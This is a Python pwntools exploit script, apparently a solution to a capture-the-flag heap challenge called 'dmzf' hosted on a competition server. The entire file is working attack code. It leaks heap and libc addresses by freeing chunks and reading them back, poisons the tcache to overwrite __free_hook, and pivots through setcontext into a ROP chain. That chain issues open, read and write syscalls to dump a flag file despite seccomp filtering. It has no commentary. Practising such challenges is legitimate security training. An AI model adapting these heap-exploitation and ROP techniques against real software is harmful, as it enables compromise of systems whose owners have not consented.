from pwn import *

e = ELF("./dmzf")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p, "x/10gx  &_Z5rulesB5cxx11")

if is_remote:
  p = remote("host1.metaproblems.com", 5810)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path + " ./libcstdc++.so ./libseccomp.so.2.4.3"})

def alloc(s):
  p.sendlineafter("> ", "add " + s)

def free(idx):
  p.sendlineafter("> ", "del " + str(idx))

def show(idx):
  p.sendlineafter("> ", "view " + str(idx))

alloc("A" * 0x37)
alloc("A" * 0x37)
alloc("A" * 0x37)
alloc("A" * 0x410)
alloc("A" * 0x410)

free(3)

free(0)
free(1)
free(2)

show(2)

p.recvuntil("2: ")
leak = u64(p.recv(8))
print(hex(leak))

alloc((p64(leak + 0x950) + p64(0x20)).ljust(0x27, "B"))

show(1)

p.recvuntil("1: ")
lleak = u64(p.recv(8)) - 0x7f925eca0270 + 0x00007f925e8b4000 
print(hex(lleak))

alloc("A" * 0x300)
alloc("A" * 0x300)

free(6)
free(7)

alloc((p64(leak +  0x000056306d4c7fd0 - 0x56306d4c7370) + p64(0x20)).ljust(0x27, "B"))

free(6)



alloc((
  p64(lleak + libc.symbols["__free_hook"])
).ljust(0x300))
debug()

prdi = 0x000275e7 + lleak
prsi =  0x0016317c + lleak
prax =  0x00043b68 + lleak
prdx = 0x00001b9e + lleak
sys = 0x001402a7 + lleak
alloc((
(
  p64(prax) + p64(2)
+ p64(prdi) + p64(leak + 0x562127af0fd0 - 0x562127af0370 + 0x200)
+ p64(prsi) + p64(0)
+ p64(prdx) + p64(0)
+ p64(sys)

+ p64(prax) + p64(0)
+ p64(prdi) + p64(3)
+ p64(prsi) + p64(leak)
+ p64(prdx) + p64(0x100)
+ p64(sys)

+ p64(prax) + p64(1)
+ p64(prdi) + p64(1)
+ p64(prsi) + p64(leak)
+ p64(prdx) + p64(0x100)
+ p64(sys)
+ p64(0x1336)
).ljust(0x200, "A")
+ "/dmzf/flag.txt\x00"
).ljust(0x300, "a"))

alloc((
  p64(lleak + libc.symbols["setcontext"] + 53)
  + "C" * 0x94 + p64(leak + 0x562127af0fd0 - 0x562127af0370) + p64(prdi + 1)
).ljust(0x300, "A"))



p.interactive()
